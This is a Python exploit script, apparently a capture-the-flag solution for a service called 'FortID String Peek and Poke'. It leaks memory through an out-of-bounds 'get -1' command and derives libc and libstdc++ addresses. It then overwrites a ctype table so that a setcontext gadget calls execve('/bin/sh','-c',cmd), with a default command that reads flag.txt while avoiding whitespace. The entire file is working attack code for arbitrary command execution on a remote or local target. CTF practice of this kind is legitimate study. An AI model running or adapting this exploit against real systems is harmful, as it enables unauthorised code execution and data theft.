#!/usr/bin/env python3
"""FortID String Peek and Poke: get -1 leak, ctype corruption, setcontext, execve."""
import argparse
import os
import select
import socket
import ssl
import struct
import subprocess
import time

p64 = lambda x: struct.pack('<Q', x & 0xffffffffffffffff)
u64 = lambda b, off=0: struct.unpack_from('<Q', b, off)[0]
BAD = b' \r\n\t\v\f'
CONFIG = {
    'host': {'locale': 0x1e3de0, 'gadget': 0x58890,
             'execve': 0xdde10, 'exit': 0x42360},
    '2.39': {'locale': 0x202de0, 'gadget': 0x5ef84,
             'execve': 0xef030, 'exit': 0x47ba0},
}

class Tube:
    def __init__(self, a):
        self.sock = None
        self.proc = None
        self.pending = b''
        if a.local:
            env = os.environ.copy()
            if a.libdir:
                env['LD_LIBRARY_PATH'] = os.path.abspath(a.libdir)
            self.proc = subprocess.Popen([os.path.abspath(a.local)], cwd=a.cwd,
                stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL, env=env)
            self.fd = self.proc.stdout.fileno()
        else:
            self.sock = socket.create_connection((a.host, a.port), timeout=5)
            if a.tls:
                self.sock = ssl.create_default_context().wrap_socket(
                    self.sock, server_hostname=a.host)
            self.fd = self.sock.fileno()

    def send(self, data):
        if self.sock:
            self.sock.sendall(data)
        else:
            self.proc.stdin.write(data)
            self.proc.stdin.flush()

    def recv(self, count, timeout=5):
        until = time.monotonic() + timeout
        while len(self.pending) < count:
            remain = until - time.monotonic()
            if remain <= 0 or not select.select([self.fd], [], [], remain)[0]:
                break
            buf = self.sock.recv(65536) if self.sock else os.read(self.fd, 65536)
            if not buf:
                break
            self.pending += buf
        out, self.pending = self.pending[:count], self.pending[count:]
        return out

    def all(self, timeout=3):
        out, self.pending = self.pending, b''
        until = time.monotonic() + timeout
        while time.monotonic() < until:
            if not select.select([self.fd], [], [], until - time.monotonic())[0]:
                break
            buf = self.sock.recv(65536) if self.sock else os.read(self.fd, 65536)
            if not buf:
                break
            out += buf
        return out

    def close(self):
        if self.sock:
            self.sock.close()
        elif self.proc:
            if self.proc.poll() is None:
                self.proc.kill()
            self.proc.wait()

def payload(leak, version, cmd):
    cfg = CONFIG[version]
    libstd = u64(leak) - 0x26fe98
    libc = u64(leak, 0x10) - cfg['locale']
    ctype = libstd + 0x27ba20
    data = bytearray(b'A' * 0x510)
    data[:0x38] = leak[:0x38]
    data[0:8] = p64(ctype + 0x150)
    data[0x38] = 0
    def at(off, blob):
        data[off:off+len(blob)] = blob
    def q(off, val):
        at(off, p64(val))
    q(0x150 + 0x38, libc + cfg['gadget'])
    q(0x150 + 0x68, ctype + 0x3e0)
    q(0x150 + 0x70, ctype + 0x430)
    q(0x150 + 0x88, 0)
    q(0x150 + 0xa0, ctype + 0x488)
    q(0x150 + 0xa8, libc + cfg['execve'])
    q(0x150 + 0xe0, ctype + 0x360)
    at(0x150 + 0x1c0, struct.pack('<I', 0x1f80))
    at(0x150 + 0x128, b'\0' * 8)
    at(0x360, b'\x7f\x03' + b'\0' * 32)
    at(0x3e0, b'/bin/sh\0')
    at(0x3f0, b'-c\0')
    command = cmd.encode()
    if len(command) >= 0x430 - 0x410:
        raise ValueError('command too long (maximum 31 bytes)')
    at(0x410, command + b'\0')
    at(0x430, p64(ctype+0x3e0) + p64(ctype+0x3f0) +
       p64(ctype+0x410) + p64(0))
    q(0x488, libc + cfg['exit'])
    forbidden = [(off, byte) for off, byte in enumerate(data) if byte in BAD]
    return bytes(data), libstd, libc, forbidden

def solve(a):
    for i in range(1, a.tries+1):
        tube = Tube(a)
        try:
            banner = tube.recv(2)
            if banner != b'> ':
                print(i, 'unexpected banner:', repr(banner))
                continue
            tube.send(b'get -1\n')
            leak = tube.recv(4096)
            if len(leak) != 4096:
                print(i, 'short leak:', len(leak))
                continue
            attack, libstd, libc, forbidden = payload(leak, a.glibc, a.cmd)
            print(i, 'libstd=', hex(libstd), 'libc=', hex(libc),
                  'whitespace=', len(forbidden), flush=True)
            if forbidden:
                continue
            tube.send(b'put -1 ' + attack + b'\nget 0\n')
            reply = tube.all()
            print('RESPONSE:', repr(reply[:3000]), flush=True)
            if b'FortID{' in reply or b'LOCAL_TEST' in reply:
                print('FLAG FOUND:', repr(reply[:1000]))
                return True
        finally:
            tube.close()
    return False

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--local')
    parser.add_argument('--cwd', default=None)
    parser.add_argument('--libdir')
    parser.add_argument('--host')
    parser.add_argument('--port', type=int)
    parser.add_argument('--tls', action='store_true')
    parser.add_argument('--glibc', choices=CONFIG, default='host')
    parser.add_argument('--cmd', default='cat'+'$'+'{IFS}flag.txt')
    parser.add_argument('--tries', type=int, default=20)
    options = parser.parse_args()
    if not options.local and (not options.host or not options.port):
        parser.error('use --local or --host HOST --port PORT')
    raise SystemExit(0 if solve(options) else 1)
